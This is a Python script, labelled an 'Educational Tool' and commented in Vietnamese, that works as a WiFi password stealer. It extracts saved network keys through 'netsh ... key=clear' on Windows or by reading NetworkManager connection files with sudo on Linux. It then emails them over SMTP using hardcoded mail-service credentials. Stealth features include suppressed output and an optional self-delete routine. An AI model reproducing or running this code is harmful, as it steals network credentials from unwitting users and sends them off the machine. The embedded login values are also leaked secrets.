# ============================================
#- Educational Tool
# For learning purposes only
# Author: [Võ Gia Nhật]
# ============================================

import os
import smtplib
import subprocess
from email.mime.text import MIMEText
from email.header import Header
import glob
import sys

# ============================================
# CẤU HÌNH - THAY ĐỔI TRƯỚC KHI CHẠY
# ============================================

# Mailtrap credentials - NÊN dùng biến môi trường thay vì để trực tiếp
YOUR_USERNAME = os.environ.get("MAILTRAP_USER", "98e63169f41627")
YOUR_PASSWORD = os.environ.get("MAILTRAP_PASS", "c8351b24cb9c23")
SMTP_HOST = "sandbox.smtp.mailtrap.io"
SMTP_PORT = 2525

# File lưu thông tin
system_information = "Informations.txt"

# Email
sender = "Private Person <from@example.com>"
receiver = "A Test User <to@example.com>"

# ============================================
# HÀM GỬI EMAIL
# ============================================

def send_email(subject, body, smtp_host, smtp_port, username, password, sender, receiver):
    """
    Gửi email qua SMTP với UTF-8 encoding
    """
    try:
        # Tạo message với UTF-8
        msg = MIMEText(body, 'plain', 'utf-8')
        msg['Subject'] = Header(subject, 'utf-8')
        msg['From'] = sender
        msg['To'] = receiver
        
        # Kết nối và gửi
        with smtplib.SMTP(smtp_host, smtp_port) as server:
            server.login(username, password)
            errors = server.sendmail(sender, receiver, msg.as_string())
            
            if errors:
                return False, f"Mail bị từ chối: {errors}"
            return True, "Gửi mail thành công!"
            
    except smtplib.SMTPAuthenticationError:
        return False, "Sai username/password!"
    except smtplib.SMTPConnectError:
        return False, "Không kết nối được server!"
    except Exception as e:
        return False, f"Lỗi: {str(e)}"

# ============================================
# HÀM LẤY WIFI PASSWORD - WINDOWS
# ============================================

def get_wifi_windows():
    """
    Lấy wifi password trên Windows bằng netsh
    """
    wifi_data = "All of Registered Connections\n"
    wifi_data += "==================================\n"
    
    try:
        # Lấy danh sách profile
        output = subprocess.check_output("netsh wlan show profile", shell=True)
        output = output.decode('utf-8', errors='ignore')
    except Exception:
        return wifi_data + "Không thể lấy danh sách wifi\n"
    
    # Parse từng profile
    list_of_word = output.split()
    j = 2
    
    for word in output.split():
        if word == "Profile":
            try:
                next_word = list_of_word[list_of_word.index(word) + j]
                next_word = next_word.split('\r\n')[0]
                k = j + 1
                
                # Ghép tên wifi có dấu cách
                while "All" not in next_word:
                    next_word += " " + list_of_word[list_of_word.index(word) + k]
                    k += 1
            except:
                pass
            
            next_word = next_word.split('\r\n')[0]
            if ':' in next_word:
                next_word = next_word.split(':')[1]
                if ' ' in next_word:
                    next_word = next_word.replace(' ', "")
            
            # Lấy chi tiết wifi
            try:
                wifi = subprocess.check_output(
                    f'netsh wlan show profile "{next_word}" key=clear', 
                    shell=True
                )
                wifi = wifi.decode('utf-8', errors='ignore')
            except:
                continue
            
            # Parse password
            wifi_data += f"\n[+] WiFi: {next_word}\n"
            list_of_words = wifi.split()
            
            try:
                key_idx = list_of_words.index("Content")
                password = list_of_words[key_idx + 2]
                password = password.split('\r\n\r\nCost')[0]
                wifi_data += f"    Password: {password}\n"
            except:
                wifi_data += "    Password: (Không có/Không lấy được)\n"
            
            j += 5
    
    return wifi_data



def get_wifi_linux():
    """
    Lấy wifi password trên Linux từ NetworkManager
    """
    wifi_data = "All of Registered Connections\n"
    wifi_data += "==================================\n"
    
    try:
        connections = glob.glob("/etc/NetworkManager/system-connections/*")
        
        for conn_file in connections:
            try:
                cmd = f"sudo cat '{conn_file}'"
                wifi_output = subprocess.check_output(cmd, shell=True)
                wifi_output = wifi_output.decode('utf-8', errors='ignore')
                
                # Parse từng dòng để lấy SSID và PSK
                ssid = ""
                psk = ""
                
                for line in wifi_output.split('\n'):
                    if line.startswith('ssid='):
                        ssid = line.replace('ssid=', '')
                    elif line.startswith('psk='):
                        psk = line.replace('psk=', '')
                
                if ssid:
                    wifi_data += f"\n[+] WiFi: {ssid}\n"
                    wifi_data += f"    Password: {psk if psk else '(Không có)'}\n"
                else:
                    wifi_data += f"\n[+] File: {os.path.basename(conn_file)}\n"
                    wifi_data += wifi_output + "\n"
                    
            except Exception:
                continue
                
    except Exception as e:
        wifi_data += f"Lỗi: {str(e)}\n"
    
    return wifi_data

# ============================================

# ============================================

def self_destruct():
    """
    Tự xóa file script sau khi chạy
    WARNING: Chỉ dùng khi hiểu rõ hậu quả
    """
    try:
        if os.name == "nt":  # Windows
            os.system(f"DEL /F {os.path.basename(__file__)}")
        else:  # Linux
            os.remove(__file__)
    except Exception:
        pass

# ============================================
# CHƯƠNG TRÌNH CHÍNH
# ============================================

def main():
    # Xác định hệ điều hành
    if os.name == "nt":
        wifi_info = get_wifi_windows()
    else:
        wifi_info = get_wifi_linux()
    
    # Tạo nội dung email
    subject = "WiFi Password Report"
    body = f"""WIFI PASSWORD STEALER by aydinnyunus.

{wifi_info}
"""
    
    # Gửi email
    success, msg = send_email(
        subject=subject,
        body=body,
        smtp_host=SMTP_HOST,
        smtp_port=SMTP_PORT,
        username=YOUR_USERNAME,
        password=YOUR_PASSWORD,
        sender=sender,
        receiver=receiver
    )
    
    # Không print ra màn hình - chỉ ghi log file nếu cần debug
    # Để debug, bỏ comment dòng dưới:
    # with open("debug.log", "w", encoding="utf-8") as f:
    #     f.write(f"Success: {success}\nMessage: {msg}\n\n{wifi_info}")
    
    # Tự xóa (tùy chọn - bỏ comment nếu muốn)
    # self_destruct()

# ============================================
# CHẠY
# ============================================

if __name__ == "__main__":
    main()